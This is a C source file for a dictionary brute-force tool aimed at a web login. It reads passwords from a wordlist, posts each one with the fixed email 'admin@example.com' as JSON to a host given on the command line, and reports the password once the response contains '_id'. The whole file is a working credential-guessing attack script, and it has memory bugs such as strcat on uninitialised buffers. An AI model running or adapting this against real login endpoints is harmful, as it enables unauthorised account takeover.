#define _GNU_SOURCE
#include <stdio.h>      /* printf, sprintf */
#include <stdlib.h>     /* exit, atoi, malloc, free */
#include <unistd.h>     /* read, write, close */
#include <string.h>     /* memcpy, memset */
#include <sys/socket.h> /* socket, connect */
#include <netinet/in.h> /* struct sockaddr_in, struct sockaddr */
#include <netdb.h>      /* struct hostent, gethostbyname */

#include <string.h>

void error(const char *msg)
{
  perror(msg);
  exit(0);
}

int main(int argc, char *argv[])
{
  // making body
  // format "{\"email\":\"admin@example.com\",\"password\":\"123456\"}"
  FILE *fp;
  char *line = NULL;
  size_t len = 0;
  ssize_t readFile;

  char *body;
  // printf("Enter name of a file you wish to see\n");
  // gets(file_name);

  int bodyLength = 0;
  int bodyLenghtbefore = 0;
  char *openingBraces = "\{";
  char *closingBraces = "\}";
  char *email = "\"email\":\"admin@example.com\",";
  char *password = "\"password\":";

  bodyLength += strlen(openingBraces);
  bodyLength += strlen(closingBraces);
  bodyLength += strlen(email);
  bodyLength += strlen(password);
  bodyLength += strlen("\"");
  bodyLength += strlen("\"");
  bodyLenghtbefore = bodyLength;

  fp = fopen("words.english", "r");
  if (fp == NULL)
    exit(EXIT_FAILURE);

  while ((readFile = getline(&line, &len, fp)) != -1)
  {
    size_t ln = strlen(line) - 1;
    //* removing new line symbol

    if (*line && line[ln] == '\n')
    {

      line[ln] = '\0';
      line[ln - 1] = '\0';
    }

    bodyLength += strlen(line);

    //* preparing the body
    char *body = malloc(bodyLength);
    strcat(body, openingBraces);
    strcat(body, email);
    strcat(body, password);
    strcat(body, "\"");
    strcat(body, line);
    strcat(body, "\"");
    strcat(body, closingBraces);
    printf("BODY:%s\n", body);

    printf("Retrieved line of length %zu:\n", readFile);
    printf("%s\n", line);
    printf("%ld\n", strlen(line));

    int i;
    /* first where are we going to send it? */
    int portno = atoi(argv[2]) > 0 ? atoi(argv[2]) : 80;
    char *host = strlen(argv[1]) > 0 ? argv[1] : "localhost";

    struct hostent *server;
    struct sockaddr_in serv_addr;
    int sockfd, bytes, sent, received, total, message_size;
    char *message, response[4096];

    if (argc < 5)
    {
      puts("Parameters: <host> <port> <method> <path> [<data> [<headers>]]");
      exit(0);
    }

    /* How big is the message? */
    message_size = 0;
    if (!strcmp(argv[3], "GET"))
    {
      message_size += strlen("%s %s%s%s HTTP/1.0\r\n"); /* method         */
      message_size += strlen(argv[3]);                  /* path           */
      message_size += strlen(argv[4]);                  /* headers        */
      if (argc > 5)
        message_size += strlen(argv[5]); /* query string   */
      for (i = 6; i < argc; i++)         /* headers        */
        message_size += strlen(argv[i]) + strlen("\r\n");
      message_size += strlen("\r\n"); /* blank line     */
    }
    else
    {
      message_size += strlen("%s %s HTTP/1.0\r\n");
      message_size += strlen(argv[3]); /* method         */
      message_size += strlen(argv[4]); /* path           */
      for (i = 6; i < argc; i++)       /* headers        */
        message_size += strlen(argv[i]) + strlen("\r\n");
      if (argc > 5)
        message_size += strlen("Content-Length: %d\r\n") + 10; /* content length */
      message_size += strlen("\r\n");                          /* blank line     */
      if (argc > 5)
        message_size += strlen(body); /* body           */
    }

    /* allocate space for the message */
    message = malloc(message_size);

    /* fill in the parameters */
    if (!strcmp(argv[3], "GET"))
    {

      if (argc > 5)
        sprintf(message, "%s %s%s%s HTTP/1.0\r\n",
                strlen(argv[3]) > 0 ? argv[3] : "GET", /* method         */
                strlen(argv[4]) > 0 ? argv[4] : "/",   /* path           */
                strlen(argv[5]) > 0 ? "?" : "",        /* ?              */
                strlen(argv[5]) > 0 ? argv[5] : "");   /* query string   */
      else
        sprintf(message, "%s %s HTTP/1.0\r\n",
                strlen(argv[3]) > 0 ? argv[3] : "GET", /* method         */
                strlen(argv[4]) > 0 ? argv[4] : "/");  /* path           */
      for (i = 6; i < argc; i++)                       /* headers        */
      {
        strcat(message, argv[i]);
        strcat(message, "\r\n");
      }
      strcat(message, "\r\n"); /* blank line     */
    }
    else
    {
      // printf("HERE");

      sprintf(message, "%s %s HTTP/1.0\r\n",
              strlen(argv[3]) > 0 ? argv[3] : "POST", /* method         */
              strlen(argv[4]) > 0 ? argv[4] : "/");   /* path           */
      // printf("MESSAGE: %s", message);
      for (i = 6; i < argc; i++) /* headers        */
      {
        strcat(message, argv[i]);
        strcat(message, "\r\n");
        // printf("MESSAGE: %s", message);
      }
      if (argc > 5)
      {

        sprintf(message + strlen(message), "Content-Length: %d\r\n", strlen(body));
        // printf("MESSAGE: %s", message);
      }
      strcat(message, "\r\n"); /* blank line     */

      if (argc > 5)
        strcat(message, body); /* body           */
    }

    /* What are we going to send? */
    printf("Request:\n%s\n", message);

    /* create the socket */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
      error("ERROR opening socket");

    /* lookup the ip address */
    server = gethostbyname(host);
    if (server == NULL)
      error("ERROR, no such host");

    /* fill in the structure */
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(portno);
    memcpy(&serv_addr.sin_addr.s_addr, server->h_addr, server->h_length);

    /* connect the socket */
    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
      error("ERROR connecting");

    /* send the request */
    total = strlen(message);
    sent = 0;
    do
    {
      bytes = write(sockfd, message + sent, total - sent);
      if (bytes < 0)
        error("ERROR writing message to socket");
      if (bytes == 0)
        break;
      sent += bytes;
    } while (sent < total);

    /* receive the response */
    memset(response, 0, sizeof(response));
    total = sizeof(response) - 1;
    received = 0;
    do
    {
      bytes = read(sockfd, response + received, total - received);
      if (bytes < 0)
        error("ERROR reading response from socket");
      if (bytes == 0)
        break;
      received += bytes;
    } while (received < total);

    if (received == total)
      error("ERROR storing complete response from socket");

    /* close the socket */
    close(sockfd);

    /* process response */
    if (strstr(response, "_id") != NULL)
    {
      printf("Response:\n%s\n", response);
      printf("\n Found the password\n");
      printf("Password is: %s\n", line);
      free(body);
      bodyLength = bodyLenghtbefore;
      free(message);
      break;
    }
    printf("Response:\n%s\n", response);

    free(body);
    bodyLength = bodyLenghtbefore;
    free(message);
  }

  fclose(fp);
  if (line)
    free(line);
  exit(EXIT_SUCCESS);
}